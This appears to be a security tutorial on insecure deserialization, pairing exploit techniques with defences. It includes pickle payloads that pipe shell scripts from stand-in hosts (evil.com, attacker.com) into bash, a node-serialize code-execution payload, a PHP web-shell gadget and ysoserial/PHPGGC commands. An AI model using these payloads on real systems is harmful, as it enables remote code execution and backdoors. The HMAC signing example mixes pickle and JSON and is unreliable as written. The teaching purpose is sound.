Insecure Deserialization

OWASP Top 10 · A08 Software and Data Integrity Failures · CWE-502 — often leads to Remote Code Execution

Serialization converts an in-memory object to bytes for storage or transmission. Deserialization reconstructs it. The vulnerability arises when an app deserializes attacker-controlled data without verifying its integrity — the deserialization process itself executes code through a gadget chain.

A gadget is an existing class in the application whose methods do something dangerous when called. A gadget chain links these classes so that deserializing a crafted object triggers a cascade of existing method calls that culminate in RCE — without injecting any new code.

Real-world gadget chains & CVEs
Java — Apache Commons Collections (CVE-2015-4852) Affected: WebLogic, JBoss, Jenkins, WebSphere CommonsCollections1: InvokerTransformer → Runtime.exec("cmd") CommonsCollections6: HashSet → TiedMapEntry → LazyMap → InvokerTransformer PHP — PHPGGC chains Symfony/RCE1: __destruct → Logger → system() Laravel/RCE1: __destruct → PendingCommand → Process::run() Guzzle/RCE1: __destruct → FileCookieJar → file_put_contents() Python — pickle (trivial, no chain needed) class Exploit: def __reduce__(self): return (os.system, ('curl http://evil.com/shell.sh|bash',)) pickle.loads(payload) # immediately executes on load Ruby — Marshal Object serialized with marshal_load hook executing system()

Each language has its own serialization format, magic methods, and risk profile. Python pickle is always RCE; Java depends on what libraries are on the classpath.

Python — pickleAlways RCE if exploited

pickle is Turing-complete. __reduce__ returns a callable + args — executed unconditionally on load. No gadget chain needed.

import pickle, os class Exploit(object): def __reduce__(self): return (os.system, ('curl http://attacker.com/shell.sh | bash',)) payload = pickle.dumps(Exploit()) # Attacker sends payload to any endpoint that calls pickle.loads() pickle.loads(payload) # shell command executes immediately — no way to stop it
Java — ObjectInputStreamRCE if vulnerable libs in classpath

Calls readObject() on every object. Serialized Java always starts with AC ED 00 05 (hex) or rO0AB (base64). Apache Commons Collections, Spring, Groovy = gadget chains available.

// Vulnerable endpoint ObjectInputStream ois = new ObjectInputStream(request.getInputStream()); Object obj = ois.readObject(); // gadget chain fires if payload crafted with ysoserial // Detection marker byte[] magic = {(byte)0xAC, (byte)0xED, 0x00, 0x05}; // Java serialized object header // Base64 starts with: rO0AB... // Safe alternative: JSON with strict schema validation (no polymorphic type info) // NEVER use: mapper.enableDefaultTyping() // this is also vulnerable!
PHP — unserialize()RCE + privilege escalation

PHP serialized objects are human-readable. Found in session cookies, remember-me tokens, hidden fields. Magic methods __wakeup / __destruct fire automatically.

// PHP serialized format — human readable, easy to tamper O:4:"User":2:{s:8:"username";s:5:"alice";s:4:"role";s:4:"user";} // O=Object, 4=classname length, "User"=class, 2=property count // Exploit via __destruct — write a web shell: class Logger { public $logfile; public $data; function __destruct() { file_put_contents($this->logfile, $this->data); } } // Attacker serializes Logger with: // logfile = "/var/www/html/shell.php" // data = "" // Deserialization writes a persistent backdoor to the web root
Node.js — node-serialize / cryoIIFE injection

node-serialize executes IIFEs (Immediately Invoked Function Expressions) during deserialization. A function string wrapped in () runs on load.

// node-serialize vulnerable payload {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(e,s){console.log(s)});}()"} // The () at the end makes it an IIFE — executes immediately when deserialized

How to find insecure deserialization endpoints and confirm exploitation.

1
Find serialized data in transit
Proxy all traffic (Burp Suite). Look for: Base64 strings starting with rO0AB (Java), strings starting with O: or a: (PHP), binary cookies, .ser file uploads, or headers/params that look like encoded objects.
2
Identify the format and language
Decode Base64 and inspect the raw bytes. Java = AC ED 00 05. PHP = starts with O:. Python pickle = \x80\x04. Ruby Marshal = \x04\x08. This tells you which exploit toolchain to use.
3
Test for privilege escalation first (low risk)
For PHP: decode, edit the role/admin field in plain text, re-encode, re-submit. Does the app grant you elevated access? This confirms insecure deserialization without needing a gadget chain.
4
Generate gadget chain payloads with ysoserial / PHPGGC
Use ysoserial for Java or PHPGGC for PHP to generate payloads for common libraries. Start with a DNS/HTTP callback to confirm code execution before attempting a reverse shell — less noisy and works through firewalls.
# Java — test with DNS callback first java -jar ysoserial.jar CommonsCollections6 'nslookup your-collaborator.com' > payload.ser # PHP — test privilege escalation php phpggc Symfony/RCE1 system id | base64 # Python — direct RCE via pickle python3 gen_pickle.py "nslookup your-collaborator.com"
5
Check for HMAC / signature on serialized data
Does the app use a signed token (JWT, HMAC cookie)? If the signature is missing or trivially forged, the deserialization is unprotected. Try replacing the signature with a null byte, empty string, or known-weak hash.
6
Use Burp's Deserialization Scanner plugin
The "Java Deserialization Scanner" and "Freddy" Burp extensions auto-detect serialized objects in requests and test them against known gadget chains for Java, PHP, Ruby, and Node.js.
① Never deserialize untrusted data Strongest defense
If your application doesn't need to deserialize user-supplied objects, don't. Use JSON or XML with strict schema validation instead. JSON has no magic methods, no gadget chains, no class instantiation.
## Python — never use pickle for user input # Vulnerable obj = pickle.loads(request.get_data()) # Safe — use JSON import json data = json.loads(request.get_data()) # no code execution possible ## Java — replace ObjectInputStream with JSON // Vulnerable ObjectInputStream ois = new ObjectInputStream(inputStream); Object obj = ois.readObject(); // Safe ObjectMapper mapper = new ObjectMapper(); // Disable polymorphic type handling! mapper.deactivateDefaultTyping(); MyClass obj = mapper.readValue(inputStream, MyClass.class);
② Cryptographically sign serialized data (HMAC) If you must serialize
Before deserializing, verify an HMAC signature over the serialized bytes. If the signature is invalid, reject — don't deserialize. The key must be secret and server-side only.
import hmac, hashlib, base64 SECRET_KEY = b'server-only-secret-key' def serialize_and_sign(obj): data = pickle.dumps(obj) # or use JSON sig = hmac.new(SECRET_KEY, data, hashlib.sha256).hexdigest() return base64.b64encode(data).decode() + '.' + sig def verify_and_load(token): parts = token.rsplit('.', 1) if len(parts) != 2: raise ValueError("Invalid token") data = base64.b64decode(parts[0]) expected = hmac.new(SECRET_KEY, data, hashlib.sha256).hexdigest() if not hmac.compare_digest(parts[1], expected): raise ValueError("Signature mismatch — tampering detected") return json.loads(data) # still use JSON, not pickle!
③ Java — use a deserialization filter (JEP 290) Java 9+
Java 9+ allows an allowlist filter on ObjectInputStream. Only permitted classes can be deserialized — gadget chain classes are blocked even if they exist in the classpath.
// Java 9+ — ObjectInputFilter allowlist ObjectInputFilter filter = ObjectInputFilter.Config.createFilter( "com.myapp.User;com.myapp.Order;!*" // allow only known-safe classes ); ObjectInputStream ois = new ObjectInputStream(inputStream); ois.setObjectInputFilter(filter); // Or use SerialKiller library for older Java ObjectInputStream ois = new SerialKiller(inputStream, "serialkiller.conf"); // serialkiller.conf defines class allowlist/blocklist
④ Run deserialization in an isolated sandbox Defense in depth
If RCE is achieved via a gadget chain, sandboxing limits what the attacker can do. Run the deserializing process with minimal OS permissions, no network access, read-only filesystem, in a container with seccomp. This doesn't prevent the exploit but drastically limits its impact.
⑤ Common surfaces to audit
Session / remember-me cookies  ·  Hidden form fields containing encoded objects  ·  API parameters accepting binary or Base64 blobs  ·  File uploads processed server-side (.ser, .bin, .pkl)  ·  Message queue payloads (JMS, RabbitMQ)  ·  Cache entries (Redis, Memcached) stored as serialized objects  ·  Any endpoint accepting Content-Type: application/x-java-serialized-object
